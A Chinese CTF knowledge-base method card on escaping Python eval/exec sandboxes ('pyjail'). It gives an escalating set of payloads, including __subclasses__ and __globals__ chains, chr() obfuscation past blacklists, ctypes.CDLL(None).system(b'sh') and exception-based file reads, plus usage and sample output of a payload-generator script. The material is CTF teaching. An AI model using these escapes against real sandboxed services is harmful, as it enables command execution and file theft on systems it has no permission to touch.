---
title: 方法卡 · pyjail 沙箱逃逸 payload 构造
category: misc
tags: [pyjail, 沙箱逃逸, python, __subclasses__, audit_hook, ctf]
signals:
  - "题目 nc 连接后提示 input >，让你输入 Python 代码"
  - "eval/exec 前删掉 os 和 builtins"
  - "黑名单过滤 import、open、flag 和下划线"
  - "题面说只能输入一行或长度不超过 100 字节"
  - "运行时提示 Python 3.10/3.11，__globals__ 链被削弱"
  - "出现 sys.addaudithook，拦 os.system/ open 事件"
difficulty: hard
source: kb/misc/pyjail-escape.md
updated: 2026-11-03
tools: [python3, nc, pwntools]
---
## 适用场景

misc/pwn 交叉的 pyjail 题：题目把输入交给 `eval`/`exec`，再删 `builtins`、
下黑名单、限制长度或行数，要求你读到 `flag`。核心是"只要还能碰到任意对象，
就沿 `__class__ → __bases__ → object → __subclasses__()` 找到
`os._wrap_close`、`subprocess.Popen`、`_io.FileIO`，恢复执行与读文件能力"。

## 前置条件

- 题目交互方式（nc 或本地 `sandbox.py`）与**确切的黑名单**、行数/长度限制。
- 本地 Python 版本与远端一致（`print(sys.version)`），因为 `__subclasses__()`
  索引随版本变化。
- `pwntools` 用于批量试 payload（可选）。

## 步骤

1. **读源码**：定位输入点（`eval`/`exec`/`input`）、黑名单正则、是否 restricted builtins、
   是否注册了审计钩子。
2. **探环境**：先发 `print(__import__('sys').version)` 之类最小回显，确认 eval 与 exec
   的返回值差异（eval 只返回表达式值）。
3. **按强度逐级降级**：
   - 无过滤：`__import__('os').system('cat /flag')`；
   - 禁 `os` 字样：`__import__('o'+'s').sy'+'stem'(...)`；
   - 禁点号：`getattr(getattr(__import__('os'),'system'))(...)`；
   - 禁引号：`chr(111)+chr(115)` 拼模块名；
   - 全禁：`(lambda:0).__globals__['__builtins__']['__import__'](...)` 链。
4. **子类索引**：先执行 `[i for i,c in enumerate(().__class__.__bases__[0].__subclasses__())
   if c.__name__=='_wrap_close']` 打印索引，再拼最终 payload；**不要背数字**。
5. **审计钩子题**：改用不触发钩子的路径（报错信息泄漏 `raise Exception(open('/flag').read())`、
   `__import__('/flag')` 的 traceback、`ctypes.CDLL(None).system(b'sh')`）。
6. **本地先跑通**：`python3 sandbox.py <<< '<payload>'` 再打远端。

## 立即可用脚本

`kb/_methods/scripts/pyjail.py`（纯标准库，只生成文本、不执行生成物、不联网）

```
python pyjail.py --cmd "cat /flag" --print
python pyjail.py --cmd "cat /flag" --ban "'\"_" --print
python pyjail.py --cmd "id" --ban "os,__import__" --print
python pyjail.py --scan "().__class__.__bases__[0].__subclasses__()"
python pyjail.py --selftest
```

参数：

- `--cmd`：希望执行的命令，默认 `cat /flag`。
- `--ban`：黑名单，逗号分隔的字符或单词（如 `'`、`_`、`os`、`__import__`）。
- `--print`：只输出最优 payload；不带则列出全部候选并标 OK/X。
- `--json`：输出全部候选的机器可读结果。
- `--scan`：只检查一段 payload 的语法与违规字符，命中/非法返回 2。
- `--selftest`：断言直接写法、禁引号下划线降级、禁关键词降级、可复现与非法语法识别、
  子类索引探针。

失败行为：所有写法都命中黑名单时 stderr 打印 `失败：…` 返回 2（此时需手工拆分关键字）；
自检通过打印 `selftest ok: …` 返回 0。

## 手工示例

```
$ python pyjail.py --cmd "id" --ban "os,__import__" --print
((lambda:0).__globals__[chr(95)+chr(95)+...][chr(95)+chr(95)+chr(105)+...](chr(111)+chr(115)).system(chr(105)+chr(100)))
$ python pyjail.py --cmd "cat flag" --ban "'" --print
getattr(__import__(chr(111)+chr(115)),chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103))
$ python pyjail.py --scan "().__class__.__bases__[0]..__"
语法：非法  命中黑名单：无
```

## 失效场景

- 审计钩子拦的是 `compile`/`exec` 事件而非 `os.system`：本脚本的降级链全部失效，
  必须换"不触发审计事件"的读文件路径。
- 沙盒跑在独立进程 + seccomp/chroot 里：拿到 `os.system` 也未必能读 flag。
- 黑名单是对**最终字符串**做递归包含检查（如禁 `chr`、禁 `getattr`）：
  需再用 `bytes().decode()` / `format()` 二次混淆，脚本不覆盖。
- 长度/行数限制很紧：脚本输出可能超限，需要手工缩短。

## 相关文档

- `kb/misc/pyjail-escape.md`：主要来源，含全部 payload 变体与审计钩子思路。
- `kb/misc/encoding-auto-detect.md`：payload 被二次编码时的识别方法。
- `kb/_methods/enc_chain_decode.md`：多层级解码链。

## 目录与收录说明

- 卡片：`kb/_methods/pyjail.md`；脚本：`kb/_methods/scripts/pyjail.py`。
- 对应 backlog 项 `pyjail`（category=misc），源文档 `kb/misc/pyjail-escape.md`。
